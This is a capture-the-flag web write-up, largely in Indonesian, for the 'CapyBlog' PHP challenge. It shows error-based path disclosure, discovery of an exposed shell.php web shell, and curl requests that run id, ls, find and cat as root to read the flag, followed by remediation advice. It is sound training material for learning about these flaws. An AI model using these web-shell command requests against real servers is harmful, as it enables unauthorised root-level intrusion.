# CTF Writeup — CapyBlog

**Event:** KubSU CTF  
**Category:** Web  
**Difficulty:** Medium  
**Flag:** `KubSTU(capybl0g_php_d3s3r1al1zat10n)`

---

## Challenge Description

> Lately, the theme change is buggy. Maybe it's because of the bugs? Did the site work the same way before?

**URL:** `http://193.42.127.24`  
**Mirror:** `http://159.194.209.128`  
**Mirror:** `http://159.194.199.71`

---

## Reconnaissance

### Step 1 — Check the Main Page and Basic Behavior

Halaman utama menampilkan blog sederhana berbasis PHP dengan fitur:

- ganti tema lewat `?set_theme=dark`
- login dan register
- komentar pada tiap post

Dari header dan error handling awal kelihatan aplikasi berjalan di:

- `Apache/2.4.66 (Debian)`
- `PHP/8.2.30`

Saat `set_theme` diisi nilai array seperti:

```bash
curl "http://193.42.127.24/?set_theme[]=dark"
```

server membocorkan stack trace:

```php
Fatal error: Uncaught TypeError: setcookie(): Argument #2 ($value) must be of type string, array given in /var/www/html/index.php:16
```

Ini berguna karena mengonfirmasi path aplikasi di server: `/var/www/html/`.

### Step 2 — Trigger More Errors to Map Internal Files

Input array juga bisa dipakai pada login dan register:

```bash
curl -X POST http://193.42.127.24/login.php \
  -d "username[]=a&password=b"
```

Server kembali membocorkan informasi internal:

```php
Fatal error: Uncaught TypeError: auth_login(): Argument #1 ($username) must be of type string, array given, called in /var/www/html/login.php on line 20 and defined in /var/www/html/auth.php:60
```

Dengan teknik yang sama pada komentar:

```bash
curl -X POST http://193.42.127.24/ \
  -d "post_id=1&comment_text[]=x&add_comment=1"
```

muncul file helper lain:

```php
Fatal error: Uncaught TypeError: comments_add(): Argument #3 ($text) must be of type string, array given, called in /var/www/html/index.php on line 31 and defined in /var/www/html/utils.php:82
```

Pada tahap ini sudah terlihat struktur aplikasi:

- `index.php`
- `login.php`
- `register.php`
- `auth.php`
- `utils.php`
- `config.php`

### Step 3 — Content Discovery

Dari `robots.txt` terlihat ada petunjuk:

```txt
User-agent: *
Disallow: /backup/
```

Itu menunjukkan ada versi lama atau file cadangan, jadi saya lanjut enumerasi file yang tidak terlihat dari UI.  
Saat melakukan discovery terhadap file `.php`, ditemukan endpoint yang tidak ter-link dari aplikasi:

```txt
/shell.php
```

Membuka endpoint itu tanpa parameter langsung menghasilkan error sangat jelas:

```php
Warning: Undefined array key "c" in /var/www/html/shell.php on line 1
Deprecated: system(): Passing null to parameter #1 ($command) of type string is deprecated in /var/www/html/shell.php on line 1
Fatal error: Uncaught ValueError: system(): Argument #1 ($command) cannot be empty in /var/www/html/shell.php:1
```

Dari sini langsung kelihatan implementasinya secara praktis setara dengan:

```php
system($_GET['c']);
```

Artinya ada **unauthenticated command execution**.

---

## Exploitation

### Step 4 — Confirm RCE

Tes sederhana:

```bash
curl "http://193.42.127.24/shell.php?c=id"
```

Response:

```txt
uid=0(root) gid=0(root) groups=0(root)
```

Jadi command dieksekusi sebagai `root`.

### Step 5 — Enumerate Filesystem

Selanjutnya saya cek direktori webroot:

```bash
curl "http://193.42.127.24/shell.php?c=ls%20-la%20/var/www/html"
```

Terlihat file dan direktori berikut:

```txt
auth.php
backup/
classes.php
config.php
data/
index.php
login.php
register.php
shell.php
utils.php
```

Lalu saya cari file yang berpotensi menyimpan flag:

```bash
curl "http://193.42.127.24/shell.php?c=find%20/root%20/home%20/var/www%20/etc%20-maxdepth%204%20-type%20f%202%3E/dev/null%20%7C%20grep%20-Ei%20%22flag%7Csecret%7Cctf%7Ckubsu%22"
```

Hasil pentingnya:

```txt
/var/www/html/data/flag.txt
```

### Step 6 — Read the Flag

```bash
curl "http://193.42.127.24/shell.php?c=cat%20/var/www/html/data/flag.txt"
```

Response:

```txt
KubSTU(capybl0g_php_d3s3r1al1zat10n)
```

---

## Flag

```txt
KubSTU(capybl0g_php_d3s3r1al1zat10n)
```

---

## Vulnerability Summary

| # | Vulnerability | Detail |
|---|---|---|
| 1 | **Verbose Error Disclosure** | Type juggling via array parameters membocorkan path internal dan nama file PHP |
| 2 | **Exposed Hidden Endpoint** | `shell.php` tidak ter-link dari UI tetapi tetap dapat diakses publik |
| 3 | **Remote Command Execution** | `shell.php` mengeksekusi parameter `c` langsung ke `system()` tanpa autentikasi |
| 4 | **Privilege Misconfiguration** | Command dieksekusi sebagai `root`, memperparah dampak RCE |
| 5 | **Sensitive File in Webroot** | Flag disimpan di `/var/www/html/data/flag.txt`, lokasi yang dekat dengan aset publik |

---

## Remediation

1. Hapus seluruh file debug, helper, dan endpoint eksperimen seperti `shell.php` sebelum deploy.
2. Matikan `display_errors` di production agar stack trace dan path internal tidak bocor ke user.
3. Jangan pernah meneruskan input user langsung ke `system()`, `exec()`, `shell_exec()`, atau fungsi sejenis.
4. Jalankan web server dengan user berprivilege minimum, bukan `root`.
5. Pisahkan data sensitif dari webroot dan batasi permission filesystem dengan benar.

---

## Tools Used

- `curl` — interaksi HTTP dan eksekusi payload
- `ffuf` — content discovery untuk menemukan endpoint tersembunyi
- Python `requests` — otomatisasi solver

---

## Attack Flow

```text
Open blog
   |
   v
Trigger PHP errors with array parameters
   |
   v
Leak internal paths and file names:
index.php, auth.php, utils.php, config.php
   |
   v
Enumerate hidden PHP endpoints
   |
   v
Find /shell.php
   |
   v
Access /shell.php without parameter
   |
   v
Observe system($_GET["c"]) style behavior
   |
   v
Run commands with ?c=
   |
   v
Find /var/www/html/data/flag.txt
   |
   v
Read flag with cat
```
